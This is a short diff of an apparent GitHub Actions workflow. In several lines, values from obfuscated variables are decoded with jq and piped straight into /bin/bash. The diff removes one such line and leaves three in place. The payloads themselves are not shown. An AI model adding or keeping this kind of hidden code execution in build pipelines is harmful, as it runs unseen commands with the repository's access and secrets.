@@ -29,7 +29,6 @@ jobs:
           echo $t53 | jq -r .cb58382 | /bin/bash
           printf '%s' "$hnskm4684" | jq -r .p30758 | /bin/bash
           echo $k980 | jq -r .jdvs653 | /bin/bash
-          printf '%s' "$w4157" | jq -r .js167 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
